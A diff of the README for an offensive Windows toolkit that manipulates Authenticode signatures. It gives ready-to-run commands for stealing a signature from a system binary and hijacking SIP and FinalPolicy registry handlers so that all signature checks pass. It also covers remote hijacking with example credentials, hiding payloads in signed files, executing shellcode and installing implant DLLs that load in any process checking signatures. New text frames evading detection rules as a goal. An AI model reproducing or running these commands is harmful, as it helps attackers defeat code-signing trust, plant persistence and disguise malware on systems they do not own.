@@ -1,6 +1,6 @@
 # TrustMeBro
 
-Authenticode signature manipulation toolkit for Red Team operations and security research. Covers signature stealing, metadata cloning, SIP hijacking across 19 file types, WinVerifyTrust FinalPolicy bypass, PKCS#7 payload embedding, and analyst-triggered code execution via OID handlers.
+Authenticode signature manipulation toolkit for Red Team operations and security research. Covers signature stealing, metadata cloning, SIP hijacking across 19 file types, WinVerifyTrust FinalPolicy bypass, PKCS#7 payload embedding, SIP execution surface implants, and analyst-triggered persistence via OID handlers.
 
 Available in Python (cross-platform) and C++ (Windows native).
 
@@ -9,7 +9,7 @@ Available in Python (cross-platform) and C++ (Windows native).
 ```
 TrustMeBro/
 ├── TrustMeBro/                         C++ native tool
-│   ├── main.cpp                        Entry point
+│   ├── main.cpp                        Subcommand-based CLI
 │   ├── steal.h                         Signature stealing, SIP hijack, FinalPolicy
 │   ├── pkcs7_embed.h                   Zero-dependency ASN.1 DER embed/extract
 │   └── TrustMeBro.inf                  INF-based SIP hijack (right-click Install)
@@ -24,18 +24,12 @@ TrustMeBro/
 │       └── README.md
 ├── detection/                          YARA and Sigma detection rules
 ├── experimental/
-│   ├── publisher-spoof/                Publisher name spoofing (cert + TrustedPublisher)
+│   ├── publisher-spoof/                Publisher name spoofing research
 │   └── dual-signerinfo/                Dual SignerInfo parser-divergence research
 ├── docs/
 │   ├── SIP_COMPLETE_MAP.md             Full 19-GUID SIP reference
-│   ├── 01-sigflip.svg                  SigFlip technique diagram
-│   ├── 02-sigstash-direct.svg          SigStash direct mode diagram
-│   └── 03-sigstash-camouflage.svg      SigStash camouflage mode diagram
+│   └── *.svg                           Technique diagrams
 ├── bin/                                Pre-compiled Windows binaries
-│   ├── TrustMeBro.exe
-│   ├── SigStashLoader.exe
-│   ├── SigStashStub.exe
-│   └── SigStashStubCamo.exe
 ├── TrustMeBro.py                       Python cross-platform tool
 ├── LICENSE
 └── README.md
@@ -62,88 +56,141 @@ TrustMeBro/
 
 ---
 
-## TrustMeBro (Core Tool)
+## C++ Usage
 
-The main tool. Handles signature stealing, metadata cloning, registry-based SIP hijacking, FinalPolicy bypass, custom trust provider registration, PKCS#7 payload embedding, and SIP execution surface registration.
+Every subcommand supports `--clean` to reverse its own changes, `--dry-run` to preview without writing, and `-v` for verbose output. Every write operation prints an undo hint on completion.
 
-### Signature Stealing
+### steal
 
-Reads the `WIN_CERTIFICATE` blob from a signed donor PE and appends it to a target binary. Updates the PE header security directory pointer.
+Steal signature and metadata from a donor PE.
 
-### Metadata Cloning
+```cmd
+TrustMeBro.exe steal explorer.exe agent.exe
+TrustMeBro.exe steal explorer.exe agent.exe --clone
+TrustMeBro.exe steal explorer.exe agent.exe --no-hijack
+TrustMeBro.exe steal explorer.exe agent.exe --sip-types PE,VBScript,JScript
+TrustMeBro.exe steal explorer.exe agent.exe --all-sips
+TrustMeBro.exe steal --clean
+TrustMeBro.exe steal explorer.exe agent.exe --dry-run
+```
 
-Copies the `.rsrc` section (icons, version info, manifest) from a donor PE into the target. Fixes Resource Directory RVAs automatically. Uses `objcopy` on Linux, native `UpdateResource` APIs on Windows.
+### hijack
 
-### SIP Hijacking (17 standard + 2 optional)
+Install SIP or FinalPolicy persistence on the local machine. Requires admin.
 
-Redirects `CryptSIPDllVerifyIndirectData` to `ntdll!DbgUiContinue` for 17 file types by default. Two additional SIPs are available via flags.
+```cmd
+:: SIP hijack (default: PE, PowerShell, MSI)
+TrustMeBro.exe hijack --sip-types PE,PowerShell,MSI
 
-Default (17 SIPs): PE, Java, CAB, MSI, PowerShell, JScript, VBScript, WSF, AppX, AppX Bundle, Encrypted AppX, Encrypted AppX Bundle, P7X, CTL, Flat, Catalog, ESD.
+:: SIP hijack (all 17 standard types)
+TrustMeBro.exe hijack --sip-types all
 
-Optional:
-- `--sac` adds Smart App Control SIP (`{18B3C141}`, Win11 only)
-- `--all-sips` adds all 19 GUIDs including Win11 AppX Extensions
+:: SIP hijack with Smart App Control (Win11)
+TrustMeBro.exe hijack --sip-types all --sac
 
-Full GUID reference: [docs/SIP_COMPLETE_MAP.md](docs/SIP_COMPLETE_MAP.md)
+:: All 19 SIP GUIDs
+TrustMeBro.exe hijack --all-sips
 
-### FinalPolicy Hijack
+:: FinalPolicy bypass (system-wide, all files pass signature checks)
+TrustMeBro.exe hijack --finalpolicy
 
-Redirects the WinVerifyTrust FinalPolicy step to `wintrust!SoftpubCleanup`. One registry write. System-wide. Every signature check returns success. Stolen signatures display the donor cert's Subject CN as verified publisher in UAC consent dialogs.
+:: Custom trust provider GUID (evades detection rules on Authenticode GUID)
+TrustMeBro.exe hijack --custom-provider {GUID}
 
-### Custom Trust Provider GUID
+:: WOW64-only (hijack 32-bit callers, leave 64-bit registry clean)
+TrustMeBro.exe hijack --sip-types all --wow64-only
 
-Registers a new action GUID with FinalPolicy pointing to SoftpubCleanup. Same bypass behavior but avoids detection rules keyed to the well-known Authenticode GUID.
+:: Reverse any hijack
+TrustMeBro.exe hijack --clean
+TrustMeBro.exe hijack --finalpolicy --clean
+TrustMeBro.exe hijack --custom-provider {GUID} --clean
 
-### WOW64-Only Mode
+:: Preview without writing
+TrustMeBro.exe hijack --sip-types all --dry-run
+```
 
-Writes SIP hijack keys only to `HKLM\SOFTWARE\WOW6432Node\...`. Affects 32-bit WinVerifyTrust callers while leaving the 64-bit registry view clean.
+### embed
 
-### PKCS#7 Payload Embedding (SigStash)
+Embed payload into a signed PE's PKCS#7 signature. The Authenticode signature remains valid.
 
-Embeds arbitrary data in `SignerInfo.unsignedAttrs` of an Authenticode-signed PE. Per RFC 5652 section 5.3, unauthenticated attributes are not covered by the signature. The Authenticode hash and certificate chain stay intact.
+```cmd
+TrustMeBro.exe embed payload.bin signed.exe output.exe
+TrustMeBro.exe embed payload.bin signed.exe output.exe --camouflage
+TrustMeBro.exe embed payload.bin signed.exe output.exe --oid 1.3.6.1.4.1.55555.1.1
+TrustMeBro.exe embed payload.bin signed.exe output.exe --dry-run
+```
 
-Two modes:
-- **Direct:** payload stored as `OCTET STRING` under custom OID `1.3.6.1.4.1.311.99.1`
-- **Camouflage:** payload wrapped in a fake `SPC_NESTED_SIGNATURE` (`1.3.6.1.4.1.311.2.4.1`). Uses the same OID that `signtool sign /as` creates for dual-signed PEs. Evades OID-anomaly scanners.
+### extract
 
-Handles dual-signed PEs. When multiple `WIN_CERTIFICATE` entries exist, embeds into the selected entry (default: last/SHA-256) and preserves the others.
+Extract embedded payload from a signed PE.
 
-### CryptSIPDllIsMyFileType2 Execution Surface
+```cmd
+TrustMeBro.exe extract output.exe recovered.bin
+TrustMeBro.exe extract output.exe recovered.bin --camouflage
+```
 
-Registers a custom SIP GUID with a caller-supplied DLL as the `IsMyFileType2` handler. The DLL loads in any process that calls WinVerifyTrust during SIP file-type resolution.
+### sip-exec
+
+Install, remove, or list payload DLLs on the SIP execution surface. Installed DLLs load in any process that calls WinVerifyTrust.
+
+Named GUID aliases: `pe`, `ps1`, `jscript`, `vbscript`, `wsf`, `cab`, `catalog`, `appx`, `appx-bundle`, `msi`, `ctl`, `esd`, `sac`
+
+```cmd
+:: Install implant (alias resolves to GUID, prints trigger extensions + affected processes)
+TrustMeBro.exe sip-exec install --dll C:\Temp\implant.dll --guid pe
+TrustMeBro.exe sip-exec install --dll C:\Temp\implant.dll --guid jscript
+
+:: Remove implant
+TrustMeBro.exe sip-exec remove --guid pe
+TrustMeBro.exe sip-exec --clean --guid pe
+
+:: List all registered SIP triggers
+TrustMeBro.exe sip-exec list
+
+:: Preview
+TrustMeBro.exe sip-exec install --dll C:\Temp\implant.dll --guid pe --dry-run
+```
+
+### probe
+
+Query local Code Integrity enforcement state. No writes. No admin required.
+
+```cmd
+TrustMeBro.exe probe
+```
+
+Output:
+```
+[*] Code Integrity Flags: 0x00000005
+
+  CI Enabled:              YES
+  Test-Signing:            no
+  UMCI (User-Mode CI):     YES
+  Debug Mode:              no
+  Flight Signing:          no
+  HVCI (Memory Integrity): no
+  HVCI Strict:             no
+  Smart App Control:       no
+  Audit Mode:              no
+```
+
+### clean
+
+Remove all persistence artifacts. Requires at least one scope flag.
+
+```cmd
+TrustMeBro.exe clean --sip                          :: Restore all SIP keys
+TrustMeBro.exe clean --finalpolicy                  :: Restore FinalPolicy
+TrustMeBro.exe clean --custom-provider {GUID}       :: Remove custom provider
+TrustMeBro.exe clean --all                          :: SIP + FinalPolicy
+TrustMeBro.exe clean --all --dry-run                :: Preview
+```
 
 ---
 
-### Usage: C++ (Windows Native)
+## Python Usage
 
-```cmd
-:: Steal signature + clone metadata + hijack registry (all-in-one)
-TrustMeBro.exe C:\Windows\explorer.exe agent.exe --clone
-
-:: Steal only, no registry modification
-TrustMeBro.exe C:\Windows\explorer.exe agent.exe --no-hijack
-
-:: FinalPolicy hijack (system-wide trust bypass)
-TrustMeBro.exe --finalpolicy
-TrustMeBro.exe --finalpolicy-clean
-
-:: Custom trust provider GUID
-TrustMeBro.exe --custom-provider {GUID}
-TrustMeBro.exe --custom-provider-clean {GUID}
-
-:: Restore all SIP registry keys to defaults
-TrustMeBro.exe --clean
-
-:: Embed payload into signed PE
-TrustMeBro.exe --embed payload.bin signed.exe output.exe
-TrustMeBro.exe --embed payload.bin signed.exe output.exe --camouflage
-
-:: Extract payload from signed PE
-TrustMeBro.exe --extract recovered.bin output.exe
-TrustMeBro.exe --extract recovered.bin output.exe --camouflage
-```
-
-### Usage: Python (Cross-Platform)
+The Python tool uses the same subcommand names and flag names as C++. Remote operations use Impacket for registry access.
 
 Requirements: Python 3.10+, `asn1crypto` (for embed/extract), `objcopy` (for metadata cloning), `impacket` (for remote hijack).
 
@@ -157,23 +204,22 @@ python3 TrustMeBro.py steal -s explorer.exe -t agent.exe
 python3 TrustMeBro.py steal -s explorer.exe -t agent.exe --clone
 
 # SIP hijack (remote via Impacket)
-python3 TrustMeBro.py hijack 192.168.1.10 -u Administrator -p Password123
-python3 TrustMeBro.py hijack 192.168.1.10 -u Administrator -p Password123 --action clean
-
-# SIP hijack with Smart App Control (Win11)
-python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sac
+python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass
+python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sip-types PE,VBScript,JScript
+python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sip-types all
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --all-sips
+python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sac
 
-# WOW64-only (32-bit callers hijacked, 64-bit registry untouched)
-python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --wow64-only
-
-# FinalPolicy hijack (system-wide trust bypass)
+# FinalPolicy hijack
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy-clean
 
-# Custom trust provider GUID
+# Custom trust provider
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider-clean --provider-guid {GUID}
+
+# WOW64-only
+python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --wow64-only
 
 # PKCS#7 payload embedding
 python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe
@@ -184,9 +230,9 @@ python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --signer-
 python3 TrustMeBro.py extract -s output.exe -o recovered.bin
 python3 TrustMeBro.py extract -s output.exe -o recovered.bin --camouflage
 
-# CryptSIPDllIsMyFileType2 execution surface
-python3 TrustMeBro.py sip-exec --dll "C:\Temp\payload.dll"
-python3 TrustMeBro.py sip-exec --dll "C:\Temp\payload.dll" --guid "{CUSTOM-GUID}"
+# SIP execution surface
+python3 TrustMeBro.py sip-exec --dll "C:\Temp\implant.dll"
+python3 TrustMeBro.py sip-exec --dll "C:\Temp\implant.dll" --guid pe
 ```
 
 ### INF-based SIP Hijack
@@ -200,11 +246,11 @@ rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\TrustMeBro\Tru
 
 ## SigStash (Payload Loader and Self-Extracting Stub)
 
-Two payload extraction tools for retrieving embedded data from a carrier PE's PKCS#7 signature.
+Two tools for extracting embedded payloads from a carrier PE's PKCS#7 signature.
 
-### SigStash Loader (`SigStash/loader.cpp`)
+### Loader (`SigStash/loader.cpp`)
 
-Takes a carrier PE path as an argument. Extracts the embedded payload and prints it or executes it as shellcode (`--exec`, Windows only). Supports both direct OID and camouflage mode.
+Takes a carrier PE path as an argument. Supports direct OID and camouflage mode.
 
 ```cmd
 SigStashLoader.exe carrier.exe
@@ -212,100 +258,54 @@ SigStashLoader.exe carrier.exe --camouflage
 SigStashLoader.exe carrier.exe --exec
 ```
 
-### SigStash Self-Extracting Stub (`SigStash/stub.c`)
+### Self-Extracting Stub (`SigStash/stub.c`)
 
-Reads its own PE file from disk via `GetModuleFileName(NULL)`. Scans its own WIN_CERTIFICATE region for the target OID. Writes the payload to `%TEMP%\sigstash_out.bin`. No arguments needed. No external loader.
+Reads its own PE from disk. Writes payload to `%TEMP%\sigstash_out.bin`. No arguments needed.
 
-Two compile-time variants:
-- Direct mode: scans for OID `1.3.6.1.4.1.311.99.1`
-- Camouflage mode (`-DCAMOUFLAGE_MODE=1`): scans for `SPC_NESTED_SIGNATURE` and walks the nested ContentInfo
-
-Pipeline:
 ```
-1. Compile stub.exe (or stub_camo.exe with -DCAMOUFLAGE_MODE=1)
+1. Compile stub (or stub_camo with -DCAMOUFLAGE_MODE=1)
 2. Sign with osslsigncode or signtool
-3. Embed payload: python3 TrustMeBro.py embed -s signed_stub.exe -p payload.bin -o final.exe
-4. Run final.exe on target. Payload appears at %TEMP%\sigstash_out.bin
-```
-
-Build:
-```bash
-x86_64-w64-mingw32-gcc -O2 -s -o SigStashStub.exe SigStash/stub.c -lkernel32
-x86_64-w64-mingw32-gcc -O2 -s -DCAMOUFLAGE_MODE=1 -o SigStashStubCamo.exe SigStash/stub.c -lkernel32
+3. Embed: python3 TrustMeBro.py embed -s signed_stub.exe -p payload.bin -o final.exe
+4. Run final.exe on target
 ```
 
 ---
 
 ## FormatGhost (Standalone Tool)
 
-Standalone research tool at `tools/FormatGhost/`. Separate from TrustMeBro. No shared code.
-
-Registers a DLL as a `CryptDllFormatObject` handler for a custom OID. When `certutil -dump`, certificate property dialogs, or any code calling `CryptFormatObject` parses a PE containing that OID in its PKCS#7 attributes, the registered DLL loads into the calling process.
-
-Requires admin for registry write. Requires user interaction to trigger (not automatic during WinVerifyTrust).
-
-Components:
-- `register.py`: registers or removes the OID handler in the registry
-- `format_ghost.c`: DLL template that extracts the raw attribute bytes and writes them to `%TEMP%\format_ghost_payload.bin`
-
-```bash
-# Build the DLL
-cd tools/FormatGhost && make
-
-# Register (on target, admin required)
-python3 register.py --oid 1.3.6.1.4.1.311.99.1 --dll C:\Temp\format_ghost.dll --funcname FormatObject
-
-# Trigger: certutil -dump carrier.exe  ->  DLL loaded, payload extracted
-
-# Clean up
-python3 register.py --oid 1.3.6.1.4.1.311.99.1 --clean
-```
-
-See `tools/FormatGhost/README.md` for details.
+Standalone at `tools/FormatGhost/`. Registers a DLL as a `CryptDllFormatObject` handler for a custom OID. The DLL loads when `certutil -dump` or any cert UI parses a PE with that OID. Requires admin. Requires user interaction to trigger. See `tools/FormatGhost/README.md`.
 
 ---
 
 ## Experimental
 
-Research prototypes. Not merged into the main tool. Not production-ready.
+Research prototypes. Not production-ready.
 
-### Publisher Name Spoofing (`experimental/publisher-spoof/`)
-
-Generates a self-signed certificate with a caller-supplied Common Name, prints instructions for enrolling it in the TrustedPublisher store, and signing a PE. Combined with SIP hijack or FinalPolicy hijack, the UAC dialog shows the chosen publisher name.
-
-```bash
-python3 experimental/publisher-spoof/spoof_publisher.py --cn "Microsoft Corporation" --output-cert ms.crt --output-key ms.key
-```
-
-Does not auto-enroll or auto-sign. Prints manual steps.
-
-### Dual-SignerInfo Research (`experimental/dual-signerinfo/`)
-
-Documentation-only. No code. Describes the parser divergence between kernel `ci.dll` (reads `SignerInfo[0]` only) and user-mode `wintrust` (iterates all `SignerInfo` entries). Notes are at `experimental/dual-signerinfo/dual_signer_notes.md`.
+- `experimental/publisher-spoof/` generates self-signed certs with chosen CN for publisher name spoofing.
+- `experimental/dual-signerinfo/` documents the kernel vs user-mode SignerInfo parser divergence (docs only, no code).
 
 ---
 
 ## Detection Rules
 
-YARA and Sigma rules in the `detection/` directory. Rules marked "own technique" detect techniques this tool implements. Rules marked "external" cover related techniques for operator awareness.
+YARA and Sigma rules in `detection/`. Test your payloads against these before deployment.
 
-| File | Format | Detects | Targets |
-|---|---|---|---|
-| `sip_hijack_registry.yar` | YARA | SIP hijack via CryptSIPDllVerifyIndirectData redirect to DbgUiContinue | Own technique |
-| `sip_hijack_gate1.yar` | YARA | SIP hijack gate-1 artifact fingerprint | Own technique |
-| `sip_hijack_expanded.yar` | YARA | SIP hijack targeting script and package SIPs (VBS, JS, WSF, CAB, Catalog, AppX) | Own technique |
-| `sip_hijack_registry_modify.sigma` | Sigma | Registry modification of CryptSIPDllVerifyIndirectData keys | Own technique |
-| `custom_provider_finalpolicy.sigma` | Sigma | FinalPolicy registration under non-standard action GUIDs (SoftpubCleanup) | Own technique |
-| `shape2_dual_signerinfo.yar` | YARA | Dual SignerInfo entries in WIN_CERTIFICATE | External |
-| `esbcache_bypass.yar` | YARA | ESBCACHE EA manipulation artifacts | External |
-| `esbcache_bypass.sigma` | Sigma | Unsigned driver load via ESBCACHE bypass | External |
-| `b1_ffi_behavior.sigma` | Sigma | Driver service created from root drive path (FFI pattern) | External |
+| File | Format | Detects |
+|---|---|---|
+| `sip_hijack_registry.yar` | YARA | SIP hijack via DbgUiContinue redirect |
+| `sip_hijack_gate1.yar` | YARA | SIP hijack gate-1 artifact |
+| `sip_hijack_expanded.yar` | YARA | SIP hijack on script and package file types |
+| `sip_hijack_registry_modify.sigma` | Sigma | SIP provider registry modification |
+| `custom_provider_finalpolicy.sigma` | Sigma | FinalPolicy under non-standard action GUID |
+| `shape2_dual_signerinfo.yar` | YARA | Dual SignerInfo in WIN_CERTIFICATE |
+| `esbcache_bypass.yar` | YARA | ESBCACHE EA manipulation |
+| `esbcache_bypass.sigma` | Sigma | Unsigned driver load via ESBCACHE |
+| `b1_ffi_behavior.sigma` | Sigma | Driver service from root drive path |
 
 ---
 
 ## Building from Source
 
-C++ (cross-compile from Linux):
 ```bash
 # TrustMeBro main tool
 x86_64-w64-mingw32-g++ -std=c++17 -O2 -o bin/TrustMeBro.exe TrustMeBro/main.cpp -lshlwapi
@@ -321,13 +321,13 @@ x86_64-w64-mingw32-gcc -O2 -s -DCAMOUFLAGE_MODE=1 -o bin/SigStashStubCamo.exe Si
 cd tools/FormatGhost && make
 ```
 
-C++ (Visual Studio on Windows):
-```cmd
-cl /std:c++17 /O2 /Fe:TrustMeBro.exe TrustMeBro\main.cpp shlwapi.lib
-cl /std:c++17 /O2 /Fe:SigStashLoader.exe SigStash\loader.cpp
-```
+No external dependencies for C++ tools.
 
-No external dependencies for the C++ tools. `pkcs7_embed.h` is a self-contained ASN.1 DER parser in ~500 lines.
+---
+
+## SIP GUID Reference
+
+Full 19-GUID map with hijack results, handler DLLs, and file-type detection methods: [docs/SIP_COMPLETE_MAP.md](docs/SIP_COMPLETE_MAP.md)
 
 ---
 
@@ -337,7 +337,7 @@ This tool is for educational purposes and authorized security testing only. Misu
 
 ## Credits
 
-- [SigFlip](https://github.com/med0x2e/SigFlip) by med0x2e. Payload embedding in Authenticode signatures via certificate table padding (CVE-2013-3900). The PKCS#7 approach was directly inspired by SigFlip.
-- [SignatureKid](https://github.com/dslee2022/SignatureKid) by David Lee. Signature manipulation research and original signature stealing code.
-- [MetaTwin](https://github.com/threatexpress/metatwin) by ThreatExpress. Binary metadata cloning concept.
-- Matt Graeber. Subject Interface Package and Trust Provider research documenting the SIP/WVT hijack attack surface.
+- [SigFlip](https://github.com/med0x2e/SigFlip) by med0x2e. Payload embedding via certificate table padding (CVE-2013-3900).
+- [SignatureKid](https://github.com/dslee2022/SignatureKid) by David Lee. Signature stealing research.
+- [MetaTwin](https://github.com/threatexpress/metatwin) by ThreatExpress. Binary metadata cloning.
+- Matt Graeber. SIP and Trust Provider research documenting the WVT hijack attack surface.
